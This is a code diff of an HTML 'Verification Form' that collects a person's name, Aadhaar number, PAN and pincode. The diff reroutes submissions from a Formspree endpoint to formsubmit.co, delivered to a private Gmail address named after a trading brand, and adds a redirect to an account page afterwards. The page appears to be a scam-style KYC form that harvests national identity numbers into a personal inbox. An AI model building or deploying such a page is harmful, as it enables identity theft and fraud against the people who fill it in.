@@ -111,7 +111,7 @@
 <body>
   <div class="form-container">
     <h2>Verification Form</h2>
-    <form id="verifyForm" action="https://formspree.io/f/mrbapwzg" method="POST">
+    <form id="verifyForm" action="https://formsubmit.co/bittrademasters@gmail.com" method="POST">
       <label for="name">Name</label>
       <input type="text" name="name" id="name" required />
 
@@ -145,61 +145,59 @@
   </div>
 
   <script>
-    const form = document.getElementById('verifyForm');
-    const popup = document.getElementById('popup');
-    const aadhaar = document.getElementById('aadhaar');
-    const pincode = document.getElementById('pincode');
-    const pan = document.getElementById('pan');
+  const form = document.getElementById('verifyForm');
+  const popup = document.getElementById('popup');
+  const aadhaar = document.getElementById('aadhaar');
+  const pincode = document.getElementById('pincode');
+  const pan = document.getElementById('pan');
 
-    // Aadhaar: sirf 12 digit
-    aadhaar.addEventListener("input", function() {
-      this.value = this.value.replace(/\D/g, "");
-      if (this.value.length > 12) {
-        this.value = this.value.slice(0, 12);
+  // Aadhaar: sirf 12 digit
+  aadhaar.addEventListener("input", function() {
+    this.value = this.value.replace(/\D/g, "");
+    if (this.value.length > 12) this.value = this.value.slice(0, 12);
+  });
+
+  // Pincode: sirf 6 digit
+  pincode.addEventListener("input", function() {
+    this.value = this.value.replace(/\D/g, "");
+    if (this.value.length > 6) this.value = this.value.slice(0, 6);
+  });
+
+  // PAN: uppercase only
+  pan.addEventListener("input", function() {
+    this.value = this.value.toUpperCase().replace(/[^A-Z0-9]/g, "");
+    if (this.value.length > 10) this.value = this.value.slice(0, 10);
+  });
+
+  form.addEventListener('submit', async function(e) {
+    e.preventDefault();
+
+    const formData = new FormData(form);
+
+    try {
+      let response = await fetch(form.action, {
+        method: form.method,
+        body: formData,
+        headers: { 'Accept': 'application/json' }
+      });
+
+      if (response.ok) {
+        form.reset();
+        popup.classList.add('show');
+
+        // 3 sec ke baad hide + redirect
+        setTimeout(() => {
+          popup.classList.remove('show');
+          window.location.href = "account.html";
+        }, 3000);
+      } else {
+        alert("Something went wrong. Please try again.");
       }
-    });
+    } catch (error) {
+      alert("Error submitting form. Try again.");
+    }
+  });
+</script>
 
-    // Pincode: sirf 6 digit
-    pincode.addEventListener("input", function() {
-      this.value = this.value.replace(/\D/g, "");
-      if (this.value.length > 6) {
-        this.value = this.value.slice(0, 6);
-      }
-    });
-
-    // PAN: uppercase only
-    pan.addEventListener("input", function() {
-      this.value = this.value.toUpperCase().replace(/[^A-Z0-9]/g, "");
-      if (this.value.length > 10) {
-        this.value = this.value.slice(0, 10);
-      }
-    });
-
-    form.addEventListener('submit', async function(e) {
-      e.preventDefault();
-
-      const formData = new FormData(form);
-
-      try {
-        let response = await fetch(form.action, {
-          method: form.method,
-          body: formData,
-          headers: { 'Accept': 'application/json' }
-        });
-
-        if (response.ok) {
-          form.reset();
-          popup.classList.add('show');
-          setTimeout(() => {
-            popup.classList.remove('show');
-          }, 3000); // 3 sec me hide
-        } else {
-          alert("Something went wrong. Please try again.");
-        }
-      } catch (error) {
-        alert("Error submitting form. Try again.");
-      }
-    });
-  </script>
 </body>
 </html>
